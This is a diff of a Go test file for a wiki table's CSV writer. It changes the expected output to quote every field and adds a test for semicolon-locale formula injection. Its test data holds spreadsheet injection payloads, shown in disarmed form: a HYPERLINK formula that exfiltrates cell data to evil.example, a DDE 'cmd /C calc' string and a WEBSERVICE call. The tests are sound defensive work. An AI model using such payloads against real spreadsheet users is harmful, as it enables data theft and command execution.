@@ -2,12 +2,14 @@ package parse
 
 import (
 	"bytes"
+	"strings"
 	"testing"
 )
 
 // The table's writers give exactly what `wiki table --format csv|json` prints:
 // apps export datasets through them and promise the CLI's bytes. The expected
-// output below was captured from the CLI before these writers existed.
+// output below was captured from the CLI before these writers existed, then
+// fully quoted when every CSV field came to be (v0.22.0).
 const tricky = `
 | date | amount | note | ok | empty | quote |
 |---|---:|---|---|---|---|
@@ -21,10 +23,10 @@ func TestTableWriteCSV(t *testing.T) {
 	if err := Tables(tricky)[0].WriteCSV(&b); err != nil {
 		t.Fatal(err)
 	}
-	want := `date,amount,note,ok,empty,quote
-2026-01-02,12.50,"coffee, ""large""",true,,"""Yes,"" she said, ""no"""
-2026-01-03,-3,<b>&</b> café | pipe,false,null,'single'
-2026-01-04,1e3,short row,,,
+	want := `"date","amount","note","ok","empty","quote"
+"2026-01-02","12.50","coffee, ""large""","true","","""Yes,"" she said, ""no"""
+"2026-01-03","-3","<b>&</b> café | pipe","false","null","'single'"
+"2026-01-04","1e3","short row","","",""
 `
 	if b.String() != want {
 		t.Errorf("csv:\n%s\nwant:\n%s", b.String(), want)
@@ -72,7 +74,7 @@ func TestTableWriteJSON(t *testing.T) {
 func TestTableWritersWithNoRows(t *testing.T) {
 	tb := Table{Header: []string{"a", "b"}}
 	var c, j bytes.Buffer
-	if err := tb.WriteCSV(&c); err != nil || c.String() != "a,b\n" {
+	if err := tb.WriteCSV(&c); err != nil || c.String() != "\"a\",\"b\"\n" {
 		t.Errorf("csv = %q, %v", c.String(), err)
 	}
 	if err := tb.WriteJSON(&j); err != nil || j.String() != "[]\n" {
@@ -102,14 +104,14 @@ func TestWriteCSVDisarmsFormulas(t *testing.T) {
 	if err := tb.WriteCSV(&b); err != nil {
 		t.Fatal(err)
 	}
-	want := "'=name,amount\n" +
-		`"'=HYPERLINK(""https://evil.example/?d=""&C3,""Invoice"")",-3` + "\n" +
-		`'@SUM(1+1)*cmd|' /C calc'!A0,+1.5` + "\n" +
-		"'-3+A1,-0.5e3\n" +
-		"'=1,.5\n" +
-		"'+,'-\n" +
-		"'\tcmd,\"'\rcmd\"\n" +
-		"plain,\"1,5\"\n"
+	want := `"'=name","amount"` + "\n" +
+		`"'=HYPERLINK(""https://evil.example/?d=""&C3,""Invoice"")","-3"` + "\n" +
+		`"'@SUM(1+1)*cmd|' /C calc'!A0","+1.5"` + "\n" +
+		`"'-3+A1","-0.5e3"` + "\n" +
+		`"'=1",".5"` + "\n" +
+		`"'+","'-"` + "\n" +
+		"\"'\tcmd\",\"'\rcmd\"\n" +
+		`"plain","1,5"` + "\n"
 	if b.String() != want {
 		t.Errorf("csv:\n%q\nwant:\n%q", b.String(), want)
 	}
@@ -144,7 +146,19 @@ func TestWriteCSVSeesPastABOM(t *testing.T) {
 	if err := tb.WriteCSV(&b); err != nil {
 		t.Fatal(err)
 	}
-	if want := "'\ufeff=1+1,b\nok,ok\n"; b.String() != want {
+	if want := "\"'\ufeff=1+1\",\"b\"\n\"ok\",\"ok\"\n"; b.String() != want {
+		t.Errorf("csv %q, want %q", b.String(), want)
+	}
+}
+
+// A cell that starts plain but holds `;=` can't become a live formula in a
+// `;`-splitting locale: every CSV field is quoted. (Audy, Medium.)
+func TestWriteCSVQuotesASemicolonCell(t *testing.T) {
+	var b strings.Builder
+	if err := (Table{Header: []string{"note"}, Rows: [][]string{{"x;=WEBSERVICE(B9&B10)"}}}).WriteCSV(&b); err != nil {
+		t.Fatal(err)
+	}
+	if want := "\"note\"\n\"x;=WEBSERVICE(B9&B10)\"\n"; b.String() != want {
 		t.Errorf("csv %q, want %q", b.String(), want)
 	}
 }
